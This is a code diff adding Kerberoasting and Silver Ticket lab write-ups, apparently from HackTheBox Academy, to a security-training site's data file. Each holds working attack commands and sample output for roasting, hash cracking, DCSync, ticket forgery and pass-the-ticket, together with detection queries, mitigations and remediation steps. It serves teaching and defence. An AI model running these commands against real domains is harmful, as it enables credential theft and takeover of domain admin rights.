@@ -6,6 +6,10 @@ import forensicsNetworkImg from '@/assets/forensics-network.jpg';
 import adAsrepHero from '@/assets/ad-asrep-hero.jpg';
 import adAsrepFlow from '@/assets/ad-asrep-flow.jpg';
 import adAsrepCrack from '@/assets/ad-asrep-crack.jpg';
+import adKerberoastHero from '@/assets/ad-kerberoast-hero.jpg';
+import adKerberoastFlow from '@/assets/ad-kerberoast-flow.jpg';
+import adSilverTicketHero from '@/assets/ad-silverticket-hero.jpg';
+import adSilverTicketFlow from '@/assets/ad-silverticket-flow.jpg';
 
 export interface MitreTechnique {
   id: string;
@@ -954,6 +958,422 @@ export const adAttackRooms: AdAttackRoom[] = [
       { title: 'MITRE ATT&CK T1558.004', url: 'https://attack.mitre.org/techniques/T1558/004/' },
       { title: 'Microsoft — Kerberos Pre-Authentication', url: 'https://learn.microsoft.com/en-us/windows-server/security/kerberos/preventing-open-network-sharing' },
       { title: 'Hashcat mode 18200 reference', url: 'https://hashcat.net/wiki/doku.php?id=example_hashes' },
+    ],
+  },
+  // ======================= KERBEROASTING =======================
+  {
+    id: 'ad-kerberoasting',
+    slug: 'ad-kerberoasting',
+    name: 'Kerberoasting — Cracking Service Account TGS Tickets',
+    shortName: 'Kerberoasting',
+    category: 'Credential Access',
+    severity: 'High',
+    difficulty: 'Medium',
+    publishedAt: '2025-05-05',
+    author: 'Ahmed Tareq',
+    readingTime: 14,
+    labProvider: 'HackTheBox',
+    labName: 'Kerberoasting — HTB Academy',
+    labUrl: 'https://academy.hackthebox.com/module/details/143',
+    coverImage: adKerberoastHero,
+    summary:
+      'Kerberoasting abuses a legitimate Kerberos feature: any authenticated domain user can request a TGS ticket for any account that has a Service Principal Name (SPN). The TGS is encrypted with the service account\'s NT hash, so an attacker can crack it offline — without ever touching the target service or triggering a lockout.',
+    prerequisites: [
+      'Any low-privileged domain user (no admin rights needed).',
+      'Network reach to the Domain Controller on TCP/UDP 88 (Kerberos).',
+      'Linux box with Impacket OR a Windows foothold with Rubeus / PowerView.',
+      'hashcat or john for offline cracking, plus a wordlist (rockyou.txt + rules).',
+    ],
+    attackFlow: [
+      'Authenticate to the domain as any user (or relay creds).',
+      'Enumerate accounts where servicePrincipalName attribute is set.',
+      'Request a TGS-REQ for each SPN — the KDC returns TGS encrypted with the service account NT hash.',
+      'Extract the encrypted blob in $krb5tgs$23$ format (RC4 etype is the cracking sweet-spot).',
+      'Crack offline with hashcat -m 13100 against rockyou + rules.',
+      'Use the recovered service-account password to pivot, often with high privileges.',
+    ],
+    walkthrough: [
+      {
+        title: 'Step 1 — Enumerate SPNs in the domain',
+        description:
+          'A Service Principal Name (SPN) ties an account to a service (MSSQLSvc/sql01.htb:1433, HTTP/web01, etc). Any account with an SPN can be Kerberoasted. We pull them with GetUserSPNs.py — fast, unauth-friendly with creds, and gives us the full list before we make any noisy requests.',
+        commands: [
+          'GetUserSPNs.py -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD\\!',
+        ],
+        output: 'ServicePrincipalName       Name      MemberOf\n--------------------------  --------  -----------------------------------\nMSSQLSvc/sql01.htb:1433     sqlsvc    CN=Domain Admins,CN=Users,DC=...\nHTTP/web01                  websvc    CN=Service Accounts,...',
+        image: { src: adKerberoastFlow, caption: 'Kerberos TGS-REQ flow — the KDC encrypts the TGS with the service account NT hash.' },
+      },
+      {
+        title: 'Step 2 — Request TGS tickets for every SPN',
+        description:
+          'Adding -request makes Impacket actually send the TGS-REQ for each SPN found. The KDC returns one TGS per service, encrypted with that service account\'s NT hash. We force RC4 (etype 23) where possible because it cracks orders-of-magnitude faster than AES.',
+        commands: [
+          'GetUserSPNs.py -request -outputfile tgs_hashes.txt -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD\\!',
+        ],
+        output: '$krb5tgs$23$*sqlsvc$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01.htb:1433*$3a8c...$f2b1...c9',
+      },
+      {
+        title: 'Step 3 — Roast natively from a Windows foothold (Rubeus)',
+        description:
+          'On a Windows beachhead, Rubeus uses the host\'s own Kerberos APIs which blends with normal traffic. The /nowrap flag prevents line-wrapping that would corrupt the hash for hashcat.',
+        commands: [
+          'Rubeus.exe kerberoast /outfile:tgs.txt /nowrap',
+          'Rubeus.exe kerberoast /user:sqlsvc /domain:INLANEFREIGHT.LOCAL /nowrap',
+        ],
+      },
+      {
+        title: 'Step 4 — Crack the TGS hash offline',
+        description:
+          'Mode 13100 is purpose-built for Kerberos 5 TGS-REP etype 23. Combine rockyou with the d3ad0ne/OneRule rule-set and you\'ll catch every weak service password in minutes on a single GPU.',
+        commands: [
+          'hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --force',
+          'john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs tgs_hashes.txt',
+        ],
+        output: '$krb5tgs$23$*sqlsvc$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01.htb:1433*$...:Summer2024!',
+      },
+      {
+        title: 'Step 5 — Pivot with the cracked service account',
+        description:
+          'Service accounts are notoriously over-privileged (DBAs put them in Domain Admins). Use the new creds with NetExec to spray the domain, then BloodHound the path to DA.',
+        commands: [
+          'nxc smb 10.10.10.0/24 -u sqlsvc -p \'Summer2024!\'',
+          'bloodhound-python -u sqlsvc -p \'Summer2024!\' -d inlanefreight.local -ns 10.10.10.161 -c All',
+        ],
+      },
+    ],
+    commandsCheatsheet: [
+      { title: 'Impacket — list SPNs', command: 'GetUserSPNs.py DOMAIN/user:pass -dc-ip <DC>' },
+      { title: 'Impacket — request + dump', command: 'GetUserSPNs.py -request -outputfile tgs.txt DOMAIN/user:pass -dc-ip <DC>' },
+      { title: 'Rubeus — kerberoast all', command: 'Rubeus.exe kerberoast /outfile:tgs.txt /nowrap' },
+      { title: 'Hashcat — crack TGS (etype 23)', command: 'hashcat -m 13100 tgs.txt rockyou.txt -r d3ad0ne.rule --force' },
+      { title: 'PowerView — Get-DomainSPNTicket', command: 'Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Out-File tgs.txt' },
+    ],
+    commandExplanations: [
+      {
+        command: 'GetUserSPNs.py -request -outputfile tgs_hashes.txt -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD!',
+        purpose: 'Enumerate every SPN in the domain and immediately request a TGS for each one, dumping crackable hashes.',
+        breakdown: [
+          { flag: '-request', meaning: 'After enumeration, send the TGS-REQ and capture the encrypted ticket.' },
+          { flag: '-outputfile', meaning: 'Write hashes in $krb5tgs$23$ format ready for hashcat -m 13100.' },
+          { flag: '-dc-ip', meaning: 'Target Domain Controller IP — required when DNS isn\'t pointing at the DC.' },
+          { flag: 'DOMAIN/user:pass', meaning: 'Authentication context — Kerberoasting requires any valid domain user.' },
+        ],
+        why: 'This is the canonical one-shot Kerberoast: it does the LDAP enumeration and TGS request in a single authenticated session, so one network burst = full hash dump.',
+      },
+      {
+        command: 'Rubeus.exe kerberoast /outfile:tgs.txt /nowrap',
+        purpose: 'Native Windows Kerberoasting from a domain-joined beachhead — auto-discovers every roastable account.',
+        breakdown: [
+          { flag: 'kerberoast', meaning: 'Rubeus action — LDAP-search SPN-bearing accounts then request TGS for each.' },
+          { flag: '/outfile:tgs.txt', meaning: 'Persist hashes to disk for offline cracking.' },
+          { flag: '/nowrap', meaning: 'Disable line-wrapping so the long hash stays a single line (otherwise hashcat will reject it).' },
+        ],
+        why: 'Rubeus uses the host\'s built-in Kerberos APIs, so the TGS-REQ traffic is indistinguishable from a legitimate user accessing services — much stealthier than Impacket from off-net.',
+      },
+      {
+        command: 'hashcat -m 13100 tgs_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --force',
+        purpose: 'GPU-crack the captured TGS-REP RC4 hash against a wordlist with mutation rules.',
+        breakdown: [
+          { flag: '-m 13100', meaning: 'Hash-mode for Kerberos 5 TGS-REP etype 23 (RC4-HMAC).' },
+          { flag: '-r d3ad0ne.rule', meaning: 'Apply 30k+ password mutation rules (capitalisations, leet, year-suffixes).' },
+          { flag: '--force', meaning: 'Skip OpenCL warnings on VMs / odd GPUs.' },
+        ],
+        why: 'The TGS-REP is RC4(NT-hash(password)). Hashcat tries each candidate, derives its NT hash, encrypts a known plaintext and compares — no traffic, no lockout, just GPU cycles.',
+      },
+    ],
+    toolsExplained: [
+      { name: 'Impacket — GetUserSPNs.py', category: 'Credential Access', purpose: 'Enumerate SPNs and pull TGS hashes from Linux.', why: 'Single-binary, scriptable, the de-facto Kerberoasting tool in HTB labs and real engagements.', link: 'https://github.com/fortra/impacket' },
+      { name: 'Rubeus', category: 'Kerberos / Windows', purpose: 'Kerberoast natively from a Windows host.', why: 'Uses the host Kerberos stack so traffic blends in; runs in-memory from C2.', link: 'https://github.com/GhostPack/Rubeus' },
+      { name: 'PowerView', category: 'AD Recon', purpose: 'AD enumeration & SPN ticket grabbing in PowerShell.', why: 'Living-off-the-land alternative when binaries are blocked by AppLocker.', link: 'https://github.com/PowerShellMafia/PowerSploit' },
+      { name: 'hashcat', category: 'Offline Cracking', purpose: 'GPU password recovery.', why: 'Mode 13100 is purpose-built for TGS-REP etype 23 — fastest path to plaintext.', link: 'https://hashcat.net/hashcat/' },
+      { name: 'NetExec (CrackMapExec)', category: 'Lateral Movement', purpose: 'Spray cracked creds across the domain.', why: 'Validates whether the cracked service password unlocks SMB / WinRM / MSSQL on hundreds of hosts in one command.', link: 'https://github.com/Pennyw0rth/NetExec' },
+      { name: 'BloodHound', category: 'Path Mapping', purpose: 'Map graph-based attack paths.', why: 'Once you own the service account, BloodHound shows the shortest path to Domain Admin.', link: 'https://bloodhound.specterops.io' },
+    ],
+    enumerationDetection: [
+      {
+        title: 'LDAP burst querying servicePrincipalName',
+        description: 'Kerberoasting always starts with an LDAP search filtering on (servicePrincipalName=*). Domain Controllers log this in 1644 (LDAP search statistics, must be enabled via the registry/GPO).',
+        eventIds: ['1644'],
+        dataSource: 'Domain Controller — Directory Services log',
+        queryLanguage: 'KQL',
+        severity: 'Medium',
+        query: 'Event\n| where Source == "Microsoft-Windows-ActiveDirectory_DomainService" and EventID == 1644\n| where RenderedDescription has "servicePrincipalName"\n| summarize count() by Account=tostring(parse_xml(EventData).EventData.Data[2]), bin(TimeGenerated, 5m)\n| where count_ > 5',
+      },
+      {
+        title: 'Suspicious tooling on endpoints',
+        description: 'Catch the offensive tool before the DC sees the TGS-REQ. Look for Rubeus / GetUserSPNs / Invoke-Kerberoast strings in command lines and PowerShell ScriptBlock logs.',
+        eventIds: ['4688', '4104'],
+        dataSource: 'Endpoint — Sysmon / Defender ATP',
+        queryLanguage: 'KQL',
+        severity: 'High',
+        query: 'DeviceProcessEvents\n| where ProcessCommandLine has_any ("kerberoast","GetUserSPNs","Invoke-Kerberoast","Rubeus.exe")\n   or (InitiatingProcessFileName in~ ("python.exe","python3","powershell.exe")\n       and ProcessCommandLine has_any ("kerberoast","SPN"))',
+      },
+    ],
+    socDetection: [
+      {
+        title: 'Canonical Kerberoast — 4769 with Ticket Encryption 0x17',
+        description: 'When an account requests many TGS tickets in a short window AND ticket encryption is RC4 (0x17), it is almost always Kerberoasting. Modern domains negotiate AES (0x12) — RC4 today is a red flag.',
+        eventIds: ['4769'],
+        dataSource: 'Domain Controller — Security log',
+        queryLanguage: 'KQL',
+        severity: 'High',
+        query: 'SecurityEvent\n| where EventID == 4769\n| where TicketEncryptionType == "0x17"  // RC4\n| where ServiceName !endswith "$" and ServiceName != "krbtgt"\n| summarize tickets=count(), services=make_set(ServiceName) by Account=TargetUserName, IpAddress, bin(TimeGenerated, 10m)\n| where tickets >= 5',
+      },
+      {
+        title: 'Honey-SPN trip-wire',
+        description: 'Create a decoy account with an enticing SPN (MSSQLSvc/finance-db.corp.local) and a 64-char random password. Any 4769 against this account = guaranteed attacker. Zero false positives.',
+        eventIds: ['4769'],
+        dataSource: 'Domain Controller — Security log',
+        queryLanguage: 'SPL',
+        severity: 'Critical',
+        query: 'index=wineventlog EventCode=4769 Service_Name="svc-honey-mssql"\n| stats count by Account_Name, Client_Address, Ticket_Encryption_Type',
+      },
+      {
+        title: 'TGS request volume anomaly',
+        description: 'Baseline normal TGS-REQ rate per user. A single account requesting >20 distinct SPN tickets in 10 minutes is statistically anomalous and warrants a Tier-2 investigation.',
+        eventIds: ['4769'],
+        dataSource: 'SIEM correlation',
+        queryLanguage: 'SPL',
+        severity: 'High',
+        query: 'index=wineventlog EventCode=4769\n| bucket _time span=10m\n| stats dc(Service_Name) as unique_spns by Account_Name, _time\n| where unique_spns > 20',
+      },
+    ],
+    detection: [
+      'Alert on Event 4769 where Ticket Encryption Type = 0x17 (RC4) for non-machine accounts.',
+      'Deploy honey-SPN accounts — any 4769 against them is a guaranteed attack.',
+      'Threshold rule: single user requesting >10 distinct SPN tickets in 10 minutes.',
+      'Process telemetry for Rubeus.exe, GetUserSPNs.py, Invoke-Kerberoast.ps1.',
+      'PowerShell ScriptBlock 4104 containing "kerberoast" or "Get-DomainSPNTicket".',
+    ],
+    mitigation: [
+      'Use Group Managed Service Accounts (gMSA) — auto-rotated 240-char passwords, uncrackable.',
+      'Force AES-only Kerberos: set msDS-SupportedEncryptionTypes = 0x18 on every service account.',
+      'Length, not complexity: every service account password ≥ 25 random characters.',
+      'Audit and remove SPNs from privileged accounts (no Domain Admin should ever have an SPN).',
+      'Enable Microsoft Defender for Identity / ATA — it baselines TGS behaviour automatically.',
+    ],
+    remediation: [
+      'Identify every cracked service account, force-reset and rotate every system that uses it.',
+      'Enumerate all SPN-bearing accounts (Get-ADUser -Filter \'servicePrincipalName -like "*"\') and migrate to gMSA.',
+      'Pull 90 days of 4769 logs and hunt for prior RC4 TGS bursts from the same source IP.',
+      'Reset krbtgt twice (10-hour gap) if the cracked account had Domain Admin to invalidate any Golden Tickets.',
+      'Deploy a permanent honey-SPN and wire the alert into the on-call paging policy.',
+    ],
+    mitre: [
+      { id: 'T1558.003', name: 'Kerberoasting', url: 'https://attack.mitre.org/techniques/T1558/003/' },
+      { id: 'T1110.002', name: 'Password Cracking', url: 'https://attack.mitre.org/techniques/T1110/002/' },
+      { id: 'T1078.002', name: 'Valid Accounts — Domain Accounts', url: 'https://attack.mitre.org/techniques/T1078/002/' },
+    ],
+    tools: ['Impacket (GetUserSPNs.py)', 'Rubeus', 'PowerView', 'Invoke-Kerberoast', 'hashcat', 'John the Ripper', 'NetExec', 'BloodHound'],
+    references: [
+      { title: 'HTB Academy — Kerberoasting', url: 'https://academy.hackthebox.com/module/details/143' },
+      { title: 'MITRE ATT&CK T1558.003', url: 'https://attack.mitre.org/techniques/T1558/003/' },
+      { title: 'Microsoft — Group Managed Service Accounts', url: 'https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview' },
+      { title: 'Hashcat mode 13100 reference', url: 'https://hashcat.net/wiki/doku.php?id=example_hashes' },
+    ],
+  },
+  // ======================= SILVER TICKET =======================
+  {
+    id: 'ad-silver-ticket',
+    slug: 'ad-silver-ticket',
+    name: 'Silver Ticket — Forging Service Tickets with a Stolen NT Hash',
+    shortName: 'Silver Ticket',
+    category: 'Persistence',
+    severity: 'Critical',
+    difficulty: 'Hard',
+    publishedAt: '2025-05-08',
+    author: 'Ahmed Tareq',
+    readingTime: 13,
+    labProvider: 'HackTheBox',
+    labName: 'Kerberos Attacks — HTB Academy',
+    labUrl: 'https://academy.hackthebox.com/module/details/143',
+    coverImage: adSilverTicketHero,
+    summary:
+      'A Silver Ticket is a forged Kerberos TGS encrypted with a service account\'s NT hash. Because the target service trusts any TGS it can decrypt, the attacker bypasses the KDC entirely — no AS-REQ, no TGS-REQ, no DC log. With one stolen hash an attacker can impersonate any user (even fake Domain Admins) against that single service for as long as the password lives.',
+    prerequisites: [
+      'NTLM hash (or AES key) of a service account — usually obtained via Kerberoasting, DCSync, or LSASS dump.',
+      'The target service\'s SPN (e.g. cifs/fileserver01.htb, MSSQLSvc/db01.htb:1433).',
+      'The domain SID (S-1-5-21-...) — pulled with whoami /user or PowerView.',
+      'Impacket (ticketer.py) or mimikatz on a Windows host.',
+    ],
+    attackFlow: [
+      'Steal a service account NT hash (Kerberoast, DCSync, LSASS).',
+      'Collect the SPN, domain FQDN, and domain SID.',
+      'Forge a TGS offline using ticketer.py / mimikatz — set the impersonated user to anyone (e.g. Administrator) and stuff the PAC with Domain Admins SIDs.',
+      'Inject the ticket into the current session (KRB5CCNAME / kerberos::ptt).',
+      'Access the target service directly — the service decrypts, validates, and grants admin access. The DC never sees the request.',
+    ],
+    walkthrough: [
+      {
+        title: 'Step 1 — Obtain the service account NT hash',
+        description:
+          'In the HTB lab path we already cracked the sqlsvc account via Kerberoasting. In the wild the hash typically comes from DCSync, LSASS dump, or a stolen keytab. Whatever the source — we need the NT hash (or AES256 key) of the account that owns the target SPN.',
+        commands: [
+          'secretsdump.py -just-dc-user sqlsvc INLANEFREIGHT.LOCAL/administrator@10.10.10.161',
+        ],
+        output: 'sqlsvc:1108:aad3b435b51404eeaad3b435b51404ee:b18b7a3d3e0b0a4e9c5d2f1a8c7b6d5e:::',
+        image: { src: adSilverTicketFlow, caption: 'Silver Ticket: forged TGS goes straight to the service, bypassing the KDC entirely.' },
+      },
+      {
+        title: 'Step 2 — Gather domain SID and target SPN',
+        description:
+          'The forged TGS PAC must contain a valid domain SID otherwise the service rejects the ticket. Get it from any domain-joined host or via Impacket.',
+        commands: [
+          'lookupsid.py INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD\\!@10.10.10.161 0 | head',
+          'whoami /user   # from any domain machine',
+        ],
+        output: 'Domain SID: S-1-5-21-3842939050-3880317879-2865463114\nSPN target: MSSQLSvc/sql01.inlanefreight.local:1433',
+      },
+      {
+        title: 'Step 3 — Forge the Silver Ticket with ticketer.py',
+        description:
+          'ticketer.py builds a TGS offline, encrypts it with the supplied NT hash, and stuffs the PAC with whatever SIDs we like. We impersonate "Administrator" and inject the well-known Domain Admins (-512) and Enterprise Admins (-519) SIDs so the target service sees us as a god.',
+        commands: [
+          'ticketer.py -nthash b18b7a3d3e0b0a4e9c5d2f1a8c7b6d5e \\\n  -domain-sid S-1-5-21-3842939050-3880317879-2865463114 \\\n  -domain INLANEFREIGHT.LOCAL \\\n  -spn MSSQLSvc/sql01.inlanefreight.local:1433 \\\n  -user-id 500 -groups 512,513,518,519,520 \\\n  Administrator',
+        ],
+        output: '[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for INLANEFREIGHT.LOCAL/Administrator\n[*] Saving ticket in Administrator.ccache',
+      },
+      {
+        title: 'Step 4 — Inject and use the ticket',
+        description:
+          'Export KRB5CCNAME to point at the ccache and Impacket\'s tools will use the forged TGS automatically. From a Windows host, mimikatz kerberos::ptt loads the .kirbi into the current logon session.',
+        commands: [
+          'export KRB5CCNAME=$PWD/Administrator.ccache',
+          'mssqlclient.py -k -no-pass INLANEFREIGHT.LOCAL/Administrator@sql01.inlanefreight.local',
+          '# Windows alternative\nmimikatz # kerberos::ptt Administrator.kirbi',
+        ],
+        output: 'SQL (INLANEFREIGHT\\Administrator  dbo@master)> EXEC xp_cmdshell \'whoami\';\nNT AUTHORITY\\SYSTEM',
+      },
+      {
+        title: 'Step 5 — Persistence considerations',
+        description:
+          'Silver Tickets live until the service account password is rotated. Resetting krbtgt does NOT invalidate them. Attackers re-use the same hash months later — making this one of the stealthiest persistence techniques in AD.',
+        commands: [
+          '# Rotate the service-account password to kill all live silver tickets\nNet user sqlsvc <NewPassword> /domain',
+        ],
+      },
+    ],
+    commandsCheatsheet: [
+      { title: 'Impacket — DCSync hash', command: 'secretsdump.py -just-dc-user <svc> DOMAIN/admin@<DC>' },
+      { title: 'Impacket — domain SID', command: 'lookupsid.py DOMAIN/user:pass@<DC> 0' },
+      { title: 'Impacket — forge TGS', command: 'ticketer.py -nthash <hash> -domain-sid <SID> -domain DOMAIN -spn <SPN> -user-id 500 -groups 512,513,518,519,520 Administrator' },
+      { title: 'Use forged ticket', command: 'export KRB5CCNAME=Administrator.ccache && mssqlclient.py -k -no-pass DOMAIN/Administrator@host' },
+      { title: 'Mimikatz — forge + inject', command: 'kerberos::golden /user:Administrator /domain:DOMAIN /sid:<SID> /target:<host> /service:cifs /rc4:<hash> /ptt' },
+    ],
+    commandExplanations: [
+      {
+        command: 'ticketer.py -nthash <hash> -domain-sid <SID> -domain DOMAIN -spn MSSQLSvc/sql01:1433 -user-id 500 -groups 512,513,518,519,520 Administrator',
+        purpose: 'Forge a Kerberos TGS offline encrypted with the service account NT hash and stuff the PAC with admin SIDs.',
+        breakdown: [
+          { flag: '-nthash', meaning: 'NT hash of the service account that owns the SPN — used as the encryption key for the forged TGS.' },
+          { flag: '-domain-sid', meaning: 'Domain SID prefix — the PAC SIDs (512 = Domain Admins) attach to this prefix.' },
+          { flag: '-spn', meaning: 'Service Principal Name we want to access (cifs/, MSSQLSvc/, HTTP/, etc).' },
+          { flag: '-user-id 500', meaning: 'RID 500 = built-in Administrator. The impersonated principal.' },
+          { flag: '-groups 512,513,518,519,520', meaning: 'Domain Admins, Domain Users, Schema Admins, Enterprise Admins, Group Policy Creators — instant god-mode in the PAC.' },
+          { flag: 'Administrator', meaning: 'Username string written into the ticket.' },
+        ],
+        why: 'Because the service decrypts the TGS with its own NT hash and trusts the PAC implicitly, every group SID we list is granted — no DC verification, no validation call (PAC validation is off by default).',
+      },
+      {
+        command: 'export KRB5CCNAME=$PWD/Administrator.ccache && mssqlclient.py -k -no-pass DOMAIN/Administrator@sql01',
+        purpose: 'Inject the forged ticket into the Linux Kerberos cache and authenticate to the target service.',
+        breakdown: [
+          { flag: 'KRB5CCNAME', meaning: 'Env var pointing to the credential cache MIT Kerberos / Impacket reads from.' },
+          { flag: '-k', meaning: 'Use Kerberos (cached ticket) instead of NTLM.' },
+          { flag: '-no-pass', meaning: 'Skip password prompt — we already have a ticket.' },
+        ],
+        why: 'No NTLM, no AS-REQ, no TGS-REQ — traffic looks like a normal authenticated SMB/MSSQL session to the target. The DC has zero visibility.',
+      },
+    ],
+    toolsExplained: [
+      { name: 'Impacket — secretsdump.py', category: 'Credential Access', purpose: 'DCSync the NT hash of any account.', why: 'Single command pulls the service account hash needed to forge the ticket.', link: 'https://github.com/fortra/impacket' },
+      { name: 'Impacket — ticketer.py', category: 'Kerberos Forgery', purpose: 'Build Silver / Golden Tickets offline on Linux.', why: 'No mimikatz needed; produces a portable .ccache that any Impacket tool can use.', link: 'https://github.com/fortra/impacket' },
+      { name: 'Mimikatz', category: 'Kerberos / Windows', purpose: 'Forge & inject Silver / Golden Tickets natively.', why: 'kerberos::golden + /ptt loads the forged TGS straight into the current logon session — no disk artefact.', link: 'https://github.com/gentilkiwi/mimikatz' },
+      { name: 'Rubeus', category: 'Kerberos / Windows', purpose: 'Modern alternative to mimikatz for ticket abuse.', why: 'C# (in-memory friendly), supports AES keys, and integrates with C2.', link: 'https://github.com/GhostPack/Rubeus' },
+      { name: 'lookupsid.py', category: 'Recon', purpose: 'Enumerate domain SID + user RIDs anonymously or with creds.', why: 'Required for the -domain-sid flag in ticketer.py.', link: 'https://github.com/fortra/impacket' },
+    ],
+    enumerationDetection: [
+      {
+        title: 'Hash theft precursor — DCSync (4662)',
+        description: 'A Silver Ticket needs a service-account hash. Spotting DCSync (Replicating Directory Changes rights used by a non-DC account) is the earliest detection point.',
+        eventIds: ['4662'],
+        dataSource: 'Domain Controller — Security log',
+        queryLanguage: 'KQL',
+        severity: 'Critical',
+        query: 'SecurityEvent\n| where EventID == 4662\n| where Properties has "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  // DS-Replication-Get-Changes\n   or  Properties has "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"  // DS-Replication-Get-Changes-All\n| where AccountName !endswith "$"',
+      },
+      {
+        title: 'LSASS access — hash dumping',
+        description: 'Hash theft from LSASS is the second most common precursor. Sysmon Event 10 with target=lsass.exe and unusual GrantedAccess masks is the giveaway.',
+        eventIds: ['10'],
+        dataSource: 'Sysmon',
+        queryLanguage: 'KQL',
+        severity: 'High',
+        query: 'Event\n| where Source == "Microsoft-Windows-Sysmon" and EventID == 10\n| where TargetImage endswith "lsass.exe"\n| where GrantedAccess in ("0x1010","0x1410","0x1438","0x143a","0x1fffff")',
+      },
+    ],
+    socDetection: [
+      {
+        title: 'TGS use without preceding TGS-REQ',
+        description: 'A real TGS use generates Event 4769 on the DC immediately before the service is hit. A Silver Ticket skips this — so a service authentication (4624 logon type 3 with Kerberos) on the member server with NO matching 4769 within ±2 minutes on the DC is a very strong indicator.',
+        eventIds: ['4624', '4769'],
+        dataSource: 'DC Security log + Member server Security log (correlation)',
+        queryLanguage: 'KQL',
+        severity: 'Critical',
+        query: 'let kerbLogons = SecurityEvent\n| where EventID == 4624 and LogonType == 3 and AuthenticationPackageName == "Kerberos"\n| project lt=TimeGenerated, TargetUserName, IpAddress, Computer;\nlet tgsReqs = SecurityEvent\n| where EventID == 4769\n| project rt=TimeGenerated, TargetUserName, IpAddress;\nkerbLogons\n| join kind=leftanti tgsReqs on TargetUserName, IpAddress\n   and $left.lt between ((rt - 2m) .. (rt + 2m))\n| where TargetUserName !endswith "$" and TargetUserName != "ANONYMOUS LOGON"',
+      },
+      {
+        title: 'PAC anomalies — non-standard logon attributes',
+        description: 'Forged PACs often have inconsistencies: logon time = 0, ticket lifetime = 10 years, or impossible group memberships. Defender for Identity flags these as "Suspected Golden / Silver Ticket usage".',
+        eventIds: ['4624', '4769'],
+        dataSource: 'Microsoft Defender for Identity',
+        queryLanguage: 'KQL',
+        severity: 'Critical',
+        query: 'IdentityLogonEvents\n| where ActionType == "LogonSuccess" and Protocol == "Kerberos"\n| where AdditionalFields has "encryption_type:0x17" or AdditionalFields has "ticket_lifetime > 10h"',
+      },
+      {
+        title: 'Service-account interactive use',
+        description: 'Service accounts shouldn\'t produce interactive (LogonType 2/10) logons — only network (3) and service (5). A 4624 LogonType 2 for a service account is a textbook impersonation indicator.',
+        eventIds: ['4624'],
+        dataSource: 'Member servers — Security log',
+        queryLanguage: 'SPL',
+        severity: 'High',
+        query: 'index=wineventlog EventCode=4624 (Logon_Type=2 OR Logon_Type=10) Account_Name="svc-*"\n| stats count by Account_Name, Workstation_Name, Logon_Type',
+      },
+    ],
+    detection: [
+      'Correlate 4624 (Kerberos logon on member server) with 4769 (TGS-REQ on DC). Missing 4769 = forged ticket.',
+      'Microsoft Defender for Identity native detection: "Suspected Silver Ticket usage".',
+      'Alert on RC4 (0x17) Kerberos tickets on services that should negotiate AES (0x12).',
+      'Hunt for DCSync (4662 with Replicating Directory Changes) and LSASS access (Sysmon 10) — Silver Ticket prerequisites.',
+      'Service accounts performing interactive logons (4624 LogonType 2/10).',
+    ],
+    mitigation: [
+      'Migrate every service account to Group Managed Service Accounts (gMSA) — passwords auto-rotate every 30 days, killing any existing Silver Ticket on rotation.',
+      'Force AES-only on the forest (msDS-SupportedEncryptionTypes = 0x18) so RC4 tickets stand out.',
+      'Enable PAC validation on critical services (KrbtgtFullPacSignature) — the service then verifies the PAC with the KDC, catching forged group SIDs.',
+      'Tier the AD model: never let service accounts accumulate Domain Admin or local admin on Tier-0 hosts.',
+      'Rotate service-account passwords every 90 days at minimum; immediately on any incident touching that account.',
+    ],
+    remediation: [
+      'Identify the compromised service account; reset its password TWICE (immediately + after 24h) to invalidate every Silver Ticket and clear cached keys.',
+      'Audit the target service (MSSQL, CIFS, etc) for any actions during the suspected window — the attacker had impersonation rights.',
+      'Review all Tier-0 group memberships (Domain Admins, Enterprise Admins) — Silver Tickets are often a stepping stone to Golden.',
+      'Pull all 4624 / 4769 logs from the affected member server for 90 days and hunt for prior Silver Ticket use.',
+      'Migrate the affected SPN to a gMSA so future password rotation is automatic.',
+      'If Domain Admin compromise is suspected, also reset krbtgt twice (10-hour gap) to kill any Golden Tickets.',
+    ],
+    mitre: [
+      { id: 'T1558.002', name: 'Silver Ticket', url: 'https://attack.mitre.org/techniques/T1558/002/' },
+      { id: 'T1550.003', name: 'Pass the Ticket', url: 'https://attack.mitre.org/techniques/T1550/003/' },
+      { id: 'T1003.006', name: 'OS Credential Dumping — DCSync', url: 'https://attack.mitre.org/techniques/T1003/006/' },
+    ],
+    tools: ['Impacket (ticketer.py, secretsdump.py, lookupsid.py)', 'Mimikatz', 'Rubeus', 'PowerView', 'BloodHound'],
+    references: [
+      { title: 'HTB Academy — Kerberos Attacks', url: 'https://academy.hackthebox.com/module/details/143' },
+      { title: 'MITRE ATT&CK T1558.002', url: 'https://attack.mitre.org/techniques/T1558/002/' },
+      { title: 'Microsoft — Group Managed Service Accounts', url: 'https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview' },
+      { title: 'SpecterOps — A Case Study in Wagging the Dog (Silver/Golden)', url: 'https://posts.specterops.io/' },
     ],
   },
 ];
